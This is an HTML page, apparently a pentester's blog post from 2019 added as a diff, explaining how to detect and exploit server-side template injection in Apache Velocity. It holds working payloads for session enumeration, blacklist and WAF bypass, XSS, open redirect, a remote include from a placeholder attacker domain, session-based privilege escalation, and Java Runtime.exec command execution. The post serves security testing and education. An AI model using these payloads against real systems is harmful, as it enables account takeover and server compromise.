@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="Anton Garcia Dosil">
+    <meta name="description" content="https://antgarsil.github.io/">
+    <meta name="keywords" content="security,pentesting,pentest,penetration testing">
+    
+    <meta property="og:site_name" content="The Antgarsil Pages">
+    <meta property="og:title" content="
+  Testing Velocity Server-Side Template Injection - The Antgarsil Pages
+">
+    <meta property="og:description" content="Exploiting the Velocity Template Engine">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://antgarsil.github.io/posts/velocity/">
+    <meta property="og:image" content="https://antgarsil.github.io/">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="https://antgarsil.github.io/posts/velocity/">
+    <meta name="twitter:image" content="https://antgarsil.github.io/">
+
+    <base href="https://antgarsil.github.io/">
+    <title>
+  Testing Velocity Server-Side Template Injection - The Antgarsil Pages
+</title>
+
+    <link rel="canonical" href="https://antgarsil.github.io/posts/velocity/">
+    
+    <link  rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Mono:400,700">
+    <link rel="stylesheet" href="https://antgarsil.github.io/css/normalize.css">
+    <link rel="stylesheet" href="https://antgarsil.github.io/css/style.min.css">
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="https://antgarsil.github.io/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="https://antgarsil.github.io/images/favicon-16x16.png" sizes="16x16">
+
+    
+
+    <meta name="generator" content="Hugo 0.54.0" />
+  </head>
+
+  <body class="">
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="https://antgarsil.github.io/">The Antgarsil Pages</a>
+    <input type="checkbox" id="menu-control"/>
+    <label class="menu-mobile  float-right " for="menu-control">
+      <span class="btn-mobile  float-right ">&#9776;</span>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item   align-left  ">
+              <a class="navigation-link" href="https://antgarsil.github.io/">Home</a>
+            </li>
+          
+            <li class="navigation-item   align-left  ">
+              <a class="navigation-link" href="https://antgarsil.github.io/posts">Blog</a>
+            </li>
+          
+            <li class="navigation-item   align-left  ">
+              <a class="navigation-link" href="https://antgarsil.github.io/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    </label>
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+  <article>
+    <header>
+      <h1 class="title">Testing Velocity Server-Side Template Injection</h1>
+      <h2 class="date">April 18, 2019</h2>
+
+      
+    </header>
+
+    
+
+<p>Velocity is a Java-based templating engine which executes server-side to craft complex layouts. Although limited in functionality, the fact that it executes server-side opens vectors for abuse if syntax is left in control of an attacker.
+This post will provide some commands we encountered useful to identify a Server-Side Template Injection (SSTI) vulnerability, enumerate the available attack surface on the platform and exploitation. The intention is to update it with any new useful command snippets which may assist in understanding security concerns regarding SSTI in velocity.</p>
+
+<h1 id="the-vulnerability">THE VULNERABILITY</h1>
+
+<p>When attempting to identify our injection, our payload should either be injected directly into a template file or evaluated programmatically such as the vulnerable snippet below:</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="err">#</span><span class="nx">evaluate</span><span class="p">(</span><span class="o">&lt;</span><span class="nx">PAYLOAD</span><span class="o">&gt;</span><span class="p">)</span>
+</code></pre></div>
+<p>If any parameter in control of an attacker can be injected into the Velocity context, several malicious actions can be performed abusing available syntax.</p>
+
+<h1 id="identification">IDENTIFICATION</h1>
+
+<p>The concept we will use to identify a vulnerable input field is to assign a variable and render it. This can be done as below:</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="err">#</span><span class="nx">set</span> <span class="p">(</span><span class="nx">$run</span><span class="o">=</span><span class="mi">1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="nx">$run</span> 
+<span class="err">#</span><span class="nx">set</span><span class="p">(</span> <span class="nx">$bar</span> <span class="o">=</span> <span class="s1">&#39;foo&#39;</span> <span class="p">)</span> <span class="nx">$bar</span>
+</code></pre></div>
+<p>These payloads will print <strong>&lsquo;2&rsquo;</strong> and <strong>&lsquo;foo&rsquo;</strong> respectively in a vulnerable application.</p>
+
+<p>On occasion the ‘#set’ instruction will be blacklisted, which we can circumvent by manipulating the syntax:</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="err">#</span><span class="p">{</span><span class="nx">set</span><span class="p">}</span> <span class="p">(</span><span class="nx">$run</span><span class="o">=</span><span class="mi">1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="nx">$run</span>
+</code></pre></div>
+<h1 id="enumeration">ENUMERATION</h1>
+
+<p>Depending on the platform in use, we may be able to enumerate interesting information.</p>
+
+<p><strong>ENUMERATE HTTPSESSION SERVER-SIDE VARIABLES</strong></p>
+
+<p>You can access the user’s session (HTTPSession) via the $session object. The command below will enumerate all server-side session variable names and their values:</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="err">#</span><span class="nx">foreach</span> <span class="p">(</span><span class="nx">$key</span> <span class="k">in</span> <span class="nx">$session</span><span class="p">.</span><span class="nx">getAttributeNames</span><span class="p">())</span> <span class="nx">$key</span><span class="o">:</span><span class="nx">$session</span><span class="p">.</span><span class="nx">getAttribute</span><span class="p">(</span><span class="nx">$key</span><span class="p">)</span> <span class="err">#</span><span class="nx">end</span>
+</code></pre></div>
+<p>Attributes can also be obtained with the below syntax:</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">$request</span><span class="p">.</span><span class="nx">getSession</span><span class="p">().</span><span class="nx">getAttribute</span><span class="p">(</span><span class="nx">$key</span><span class="p">)</span>  <span class="nx">$request</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">getAttribute</span><span class="p">(</span><span class="nx">$key</span><span class="p">)</span>
+</code></pre></div>
+<p><strong>IDENTIFY THE PLATFORM AND ENUMERATE FURTHER</strong></p>
+
+<p>Accessible methods and objects may change depending on the version of Velocity in use. Developers implementing a solution using Velocity may implement additional methods interesting for an attacker. Be sure to consult any publicly available documentation to see if there are any additional methods available for the platform you are testing.</p>
+
+<h1 id="exploitation">EXPLOITATION</h1>
+
+<p>Identification of server-side template injection can lead to several exploitation scenarios.</p>
+
+<p><strong>OPEN REDIRECTION</strong></p>
+
+<p>The server’s response (HttpServletResponse) is also available in all contexts. This will allow us to send a server-side redirection (302 response) to our victim and coerce them to browse a web application in the attackers control. This can be done as shown below:</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">$response</span><span class="p">.</span><span class="nx">sendRedirect</span><span class="p">(</span><span class="s2">&#34;https://DOMAIN&#34;</span><span class="p">)</span>
+</code></pre></div>
+<p><strong>CROSS-SITE SCRIPTING</strong></p>
+
+<p>Being able to render any content we want will allow us to also abuse this to perform client-side attacks via Cross-Site Scripting. Creating a proof of concept for this is trivial:</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="err">#</span><span class="nx">set</span><span class="p">(</span><span class="nx">$xss</span> <span class="o">=</span> <span class="s1">&#39;&lt;script&gt;alert(1);&lt;/script&gt;&#39;</span><span class="p">)</span> <span class="nx">$xss</span>
+</code></pre></div>
+<p>The interesting part where Velocity can assist us is in circumventing web application firewalls or any blacklist filtering approach. The possibilities are endless, but as an example we could do something as follows:</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="err">#</span><span class="nx">set</span><span class="p">(</span><span class="nx">$run</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;&lt;&#39;</span><span class="p">,</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">,</span><span class="s1">&#39;i&#39;</span><span class="p">,</span><span class="s1">&#39;p&#39;</span><span class="p">,</span><span class="s1">&#39;t&#39;</span><span class="p">,</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span><span class="s1">&#39;alert(1);&#39;</span><span class="p">,</span><span class="s1">&#39;&lt;&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">,</span><span class="s1">&#39;i&#39;</span><span class="p">,</span><span class="s1">&#39;p&#39;</span><span class="p">,</span><span class="s1">&#39;t&#39;</span><span class="p">,</span><span class="s1">&#39;&gt;&#39;</span><span class="p">])</span> <span class="err">#</span><span class="nx">foreach</span><span class="p">(</span><span class="nx">$key</span> <span class="k">in</span> <span class="nx">$run</span><span class="p">)</span><span class="nx">$key</span><span class="err">#</span><span class="nx">end</span>
+</code></pre></div>
+<p>The above only creates a long array of strings, which we will then concatenate and render on the application.
+REMOTE FILE INCLUDE
+If we have a restricted input length or wish to remotely manage our injected payload, we can include and execute a remote file including Velocity code by issuing the following command:</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="err">#</span><span class="nx">evaluate</span><span class="p">(</span><span class="nx">$import</span><span class="p">.</span><span class="nx">read</span><span class="p">(</span><span class="s1">&#39;http://DOMAIN&#39;</span><span class="p">))</span>
+</code></pre></div>
+<p>This technique could also be extrapolated to enumerate internal services adjacent to the affected server by attempting to connect via HTTP. The errors or delays provided by the templating engine will show whether a service is open or closed.</p>
+
+<p><strong>PRIVILEGE ESCALATION</strong></p>
+
+<p>This is an example scenario where manipulation of server-side HTTP Session variables could lead to privilege escalation. This was discovered on a product and allowed complete takeover of the affected platform.</p>
+
+<p>In this example, we have identified a server-side variable called ‘IS_ADMIN’, set to 0 for our unprivileged user. Using Velocity, we can set that variable to anything we want to gain administrative privileges on the application.
+In this sample payload, we will set the ‘IS_ADMIN’ variable to ‘1’, in order to grant our user administrative privileges. To ensure our server-side variable is used by our user, we will immediately perform a server-side redirect to the admin portal:</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">$session</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">&#34;IS_ADMIN&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">)</span> <span class="nx">$response</span><span class="p">.</span><span class="nx">sendRedirect</span><span class="p">(</span><span class="s2">&#34;https://DOMAIN/adminPortal&#34;</span><span class="p">)</span>
+</code></pre></div>
+<p><strong>REMOTE CODE EXECUTION</strong></p>
+
+<p>Velocity allows you to interface with underlying Java in order to execute code. This has been documented previously [1] and could allow an attacker to compromise the underlying infrastructure.</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="err">#</span><span class="nx">set</span><span class="p">(</span><span class="nx">$str</span><span class="o">=</span><span class="nx">$class</span><span class="p">.</span><span class="nx">inspect</span><span class="p">(</span><span class="s2">&#34;java.lang.String&#34;</span><span class="p">).</span><span class="nx">type</span><span class="p">)</span>
+<span class="err">#</span><span class="nx">set</span><span class="p">(</span><span class="nx">$chr</span><span class="o">=</span><span class="nx">$class</span><span class="p">.</span><span class="nx">inspect</span><span class="p">(</span><span class="s2">&#34;java.lang.Character&#34;</span><span class="p">).</span><span class="nx">type</span><span class="p">)</span>
+<span class="err">#</span><span class="nx">set</span><span class="p">(</span><span class="nx">$ex</span><span class="o">=</span><span class="nx">$class</span><span class="p">.</span><span class="nx">inspect</span><span class="p">(</span><span class="s2">&#34;java.lang.Runtime&#34;</span><span class="p">).</span><span class="nx">type</span><span class="p">.</span><span class="nx">getRuntime</span><span class="p">().</span><span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">))</span>
+<span class="nx">$ex</span><span class="p">.</span><span class="nx">waitFor</span><span class="p">()</span>
+<span class="err">#</span><span class="nx">set</span><span class="p">(</span><span class="nx">$out</span><span class="o">=</span><span class="nx">$ex</span><span class="p">.</span><span class="nx">getInputStream</span><span class="p">())</span>
+<span class="err">#</span><span class="nx">foreach</span><span class="p">(</span><span class="nx">$i</span> <span class="k">in</span> <span class="p">[</span><span class="mf">1.</span><span class="p">.</span><span class="nx">$out</span><span class="p">.</span><span class="nx">available</span><span class="p">()])</span>
+<span class="nx">$str</span><span class="p">.</span><span class="nx">valueOf</span><span class="p">(</span><span class="nx">$chr</span><span class="p">.</span><span class="nx">toChars</span><span class="p">(</span><span class="nx">$out</span><span class="p">.</span><span class="nx">read</span><span class="p">()))</span>
+<span class="err">#</span><span class="nx">end</span>
+</code></pre></div>
+<h2 id="references">REFERENCES</h2>
+
+<p>[1] Server-Side Template Injection: RCE for the modern web app <a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a></p>
+
+<p>[2] The Apache Velocity User Guide <a href="http://velocity.apache.org/engine/1.7/user-guide.html">http://velocity.apache.org/engine/1.7/user-guide.html</a></p>
+
+  </article>
+
+  <br/>
+
+  
+  
+</section>
+
+      </div>
+      
+    </main>
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-127742617-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+  <script src="https://antgarsil.github.io/js/app.js"></script>
+  
+  </body>
+</html>
